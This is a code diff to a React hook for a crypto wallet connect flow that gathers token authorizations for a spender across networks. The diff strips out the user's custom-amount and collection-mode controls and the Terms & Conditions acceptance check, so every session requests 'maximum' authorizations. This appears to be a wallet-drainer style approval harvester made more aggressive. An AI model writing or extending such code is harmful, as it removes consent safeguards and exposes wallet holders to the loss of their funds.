@@ -35,7 +35,6 @@ import {
   getSpenderForNetwork,
 } from "../types/connect-flow-props";
 import {
-  applyCollectionModeForNetwork,
   buildMaximumPreferences,
   buildMaximumPreferencesForNetwork,
   listIncludedAssetWork,
@@ -47,13 +46,11 @@ import { parseHumanToRaw } from "../core/chain-tokens";
 import type {
   AssetSymbol,
   AuthorizationSessionResult,
-  CollectionMode,
   CollectionPreferences,
   LinkedAccounts,
   ModalStep,
   NetworkRow,
   RowStatus,
-  TokenPreference,
   UniversalProvider,
   WalletConnectModal,
 } from "../types";
@@ -79,10 +76,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
   const [selectedKey, setSelectedKey] = useState<string | null>(null);
   const [rowStatus, setRowStatus] = useState<Record<string, RowStatus>>({});
   const [modalStep, setModalStep] = useState<ModalStep>("preferences");
-  const [collectionMode, setCollectionMode] =
-    useState<CollectionMode>("maximum");
   const [preferences, setPreferences] = useState<CollectionPreferences>({});
-  const [termsAccepted, setTermsAccepted] = useState(false);
   const [sessionResult, setSessionResult] =
     useState<AuthorizationSessionResult | null>(null);
   const [authorizingAsset, setAuthorizingAsset] = useState<{
@@ -112,9 +106,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
   const resetAuthorizeForm = useCallback(() => {
     setSelectedKey(null);
     setModalStep("preferences");
-    setCollectionMode("maximum");
     setPreferences({});
-    setTermsAccepted(false);
     setSessionResult(null);
     setAuthorizingAsset(null);
     setNativeEstimates({});
@@ -213,7 +205,6 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
         );
         // Seed independent per-network drafts; sessions still authorize one network at a time.
         setPreferences(buildMaximumPreferences(rows));
-        setCollectionMode("maximum");
         setSelectedKey(null);
         setShowResults(true);
         setModalStep("preferences");
@@ -390,7 +381,6 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       if (approving) return;
       setSelectedKey(key);
       setError(null);
-      setCollectionMode("maximum");
       setPreferences((prev) => ({
         ...prev,
         [key]: buildMaximumPreferencesForNetwork(key),
@@ -398,39 +388,6 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       void refreshNativeEstimateFor(key);
     },
     [approving, refreshNativeEstimateFor]
-  );
-
-  const onCollectionModeChange = useCallback(
-    (mode: CollectionMode) => {
-      if (approving || !selectedKey) return;
-      setCollectionMode(mode);
-      setPreferences((prev) =>
-        applyCollectionModeForNetwork(mode, selectedKey, prev)
-      );
-      setError(null);
-    },
-    [approving, selectedKey]
-  );
-
-  const onAssetPreferenceChange = useCallback(
-    (network: string, asset: AssetSymbol, patch: Partial<TokenPreference>) => {
-      if (approving) return;
-      setPreferences((prev) => {
-        const row = { ...(prev[network] ?? {}) };
-        const current = row[asset] ?? {
-          included: false,
-          mode: "custom" as const,
-          amountHuman: "",
-        };
-        row[asset] = { ...current, ...patch };
-        return { ...prev, [network]: row };
-      });
-      if (network === selectedKey) {
-        setCollectionMode("custom");
-      }
-      setError(null);
-    },
-    [approving, selectedKey]
   );
 
   const requestAuthorizeSession = useCallback(async () => {
@@ -441,11 +398,6 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       setError("Select a network first");
       return;
     }
-    if (!termsAccepted) {
-      setError("Accept the Terms & Conditions to continue");
-      return;
-    }
-
     const items = listIncludedAssetWork(preferences, networks, selectedKey);
     const validationError = validateIncludedPrefs(items);
     if (validationError) {
@@ -470,7 +422,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     try {
       logStep("APPROVAL SESSION STARTED", {
         network: selectedKey,
-        mode: collectionMode,
+        mode: "maximum",
         assetCount: items.length,
         assets: items.map((i) => `${i.network}:${i.asset}`),
       });
@@ -670,15 +622,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       approvingLockRef.current = false;
       setApproving(false);
     }
-  }, [
-    collectionMode,
-    logStep,
-    networks,
-    preferences,
-    selectedKey,
-    setStatus,
-    termsAccepted,
-  ]);
+  }, [logStep, networks, preferences, selectedKey, setStatus]);
 
   const closeResultsModal = useCallback(() => {
     if (approving) return;
@@ -696,9 +640,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     selectedKey,
     rowStatus,
     modalStep,
-    collectionMode,
     preferences,
-    termsAccepted,
     sessionResult,
     authorizingAsset,
     nativeEstimates,
@@ -709,9 +651,6 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     termsVersion: TERMS_VERSION,
     openWalletConnect,
     onSelectNetwork,
-    onCollectionModeChange,
-    onAssetPreferenceChange,
-    onTermsChange: setTermsAccepted,
     onAuthorize: () => {
       void requestAuthorizeSession();
     },
